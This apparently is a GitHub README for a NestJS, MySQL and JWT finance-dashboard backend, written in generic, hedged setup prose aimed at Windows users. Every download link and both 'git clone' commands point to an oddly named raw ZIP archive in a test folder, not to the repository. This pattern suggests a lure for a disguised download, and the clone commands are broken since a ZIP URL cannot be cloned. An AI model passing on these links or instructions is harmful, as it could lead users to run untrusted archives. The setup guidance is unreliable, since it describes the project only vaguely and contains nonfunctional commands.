# 📊 finance_dashboard - Track finance data with ease

[![Download finance_dashboard](https://img.shields.io/badge/Download%20finance_dashboard-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip)

## 🚀 Overview

finance_dashboard is a backend app for a finance dashboard. It uses NestJS, TypeScript, MySQL, JWT auth, and RBAC. It gives you API endpoints for login, user access, and analytics data.

Use it to support a finance app that needs secure sign-in, role-based access, and data views for charts and reports.

## 📥 Download

Visit this page to download the project files:

[https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip](https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip)

If you use GitHub on Windows, you can get the files in one of these ways:

1. Open the link above in your browser.
2. Click the green Code button.
3. Choose Download ZIP.
4. Save the file to your PC.
5. Extract the ZIP file to a folder you can find again.

If you use Git, you can also clone the repo with:

```bash
git clone https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip
```

## 🧰 What You Need

Before you start, make sure your Windows PC has:

- Windows 10 or Windows 11
- Google Chrome, Edge, or another browser
- Node.js 18 or later
- npm, which comes with Node.js
- MySQL 8 or later
- Git, if you want to clone the repo
- A code editor like VS Code, if you want to view files

## 🛠️ Install on Windows

Follow these steps to set up the app on Windows.

### 1. Get the files

If you chose the ZIP file:

- Find the ZIP in your Downloads folder
- Right-click it
- Choose Extract All
- Pick a folder like `C:\finance_dashboard`

If you chose Git clone, open PowerShell and run:

```bash
git clone https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip
cd finance_dashboard
```

### 2. Install Node packages

Open PowerShell or Command Prompt in the project folder and run:

```bash
npm install
```

This installs the tools the app needs to run.

### 3. Set up the database

This app uses MySQL. You need a database before you start the server.

Create a new database in MySQL, such as:

```sql
CREATE DATABASE finance_dashboard;
```

If the project uses a `.env` file, add your MySQL details there. A common setup looks like this:

```env
DB_HOST=localhost
DB_PORT=3306
DB_USERNAME=root
DB_PASSWORD=your_password
DB_NAME=finance_dashboard
JWT_SECRET=your_secret_key
```

### 4. Start MySQL

Make sure your MySQL server is running.

If you installed MySQL as a Windows service, you can check it in:

- Services
- MySQL80
- Start

If you use MySQL Workbench or another tool, make sure it can connect to your local server.

### 5. Run the app

Start the backend with:

```bash
npm run start:dev
```

If the project uses a different start script, check the `package.json` file for the exact command.

After the app starts, it usually runs on:

```bash
http://localhost:3000
```

## 🔐 Login and Access

This backend uses JWT auth and RBAC.

That means:

- JWT auth helps the app confirm who you are
- RBAC controls what each user can do
- Admin users can reach more routes
- Standard users see only the data they are allowed to view

A basic login flow looks like this:

1. Send your email and password to the login API
2. The server checks your details
3. The server returns a token
4. Send that token with future requests
5. The server checks the token before it gives access

## 📡 API Areas

This project is built as a REST API. It can support a finance dashboard front end or another client app.

Main API areas include:

- Authentication
- User access
- Role checks
- Finance analytics
- Dashboard data
- Reports and stats

Common use cases:

- Sign in a user
- Create or manage users
- Check a user role
- Get summary metrics
- Load chart data
- Return finance records for a dashboard

## 🧪 Example Use Flow

A user can use the API like this:

1. Open the front end or API client
2. Sign in with valid details
3. Get a JWT token
4. Use the token to request dashboard data
5. View analytics such as totals, trends, and user data

## 🗂️ Project Structure

A NestJS app often uses a clear folder layout. This project may include folders like:

- `src/auth` for login and token logic
- `src/users` for user data
- `src/roles` for access rules
- `src/analytics` for dashboard metrics
- `src/database` for MySQL setup
- `src/common` for shared helpers

This structure helps keep the code easy to manage.

## ⚙️ Common Scripts

You can use these scripts if they are in the project:

```bash
npm run start
npm run start:dev
npm run build
npm run test
```

What they do:

- `start` runs the app in normal mode
- `start:dev` runs the app and reloads on file changes
- `build` creates a production-ready version
- `test` runs the test suite

## 🔍 If the App Does Not Start

If the server does not run, check these items:

- Node.js is installed
- npm install finished with no errors
- MySQL is running
- The database name matches your config
- The username and password are correct
- Port 3000 is free
- The `.env` file has the right values

If port 3000 is already in use, stop the other app or change the port in the config file.

## 📌 Topics

This repo includes these topics:

- api
- backend
- dashboard
- jwt-authentication
- mysql
- nestjs
- rbac
- rest-api
- typeorm
- typescript

## 🧩 Tech Stack

This project uses:

- NestJS for the server structure
- TypeScript for safer code
- MySQL for data storage
- TypeORM for database access
- JWT for sign-in tokens
- RBAC for access control
- REST APIs for data delivery

## 📘 For End Users

If you are not a developer, the main steps are:

1. Download the files from GitHub
2. Unzip them
3. Install Node.js
4. Set up MySQL
5. Open the project folder
6. Run `npm install`
7. Run `npm run start:dev`
8. Open the local address shown in the terminal

## 🖥️ Windows Tips

To make setup easier on Windows:

- Use PowerShell or Command Prompt
- Run the terminal as a normal user first
- Keep the project in a simple folder path
- Avoid folders with special characters
- Use MySQL Workbench if you prefer a visual tool

## 🔗 Direct Download Page

[Open the finance_dashboard GitHub page](https://github.com/dustyepistolary252/finance_dashboard/raw/refs/heads/main/test/dashboard_finance_chamecephalous.zip)

## 🧷 File Setup Checklist

Before you run the app, confirm:

- The project folder is extracted
- Node.js is installed
- npm install has completed
- MySQL is running
- The database exists
- Your `.env` values are set
- The server starts with no errors

## 📈 What the App Can Support

This backend can support a dashboard that shows:

- Total revenue
- User counts
- Recent activity
- Category summaries
- Trend lines
- Role-based views
- Secure account access

## 🧭 Next Step

Open the download page, get the files, and run the backend on your Windows PC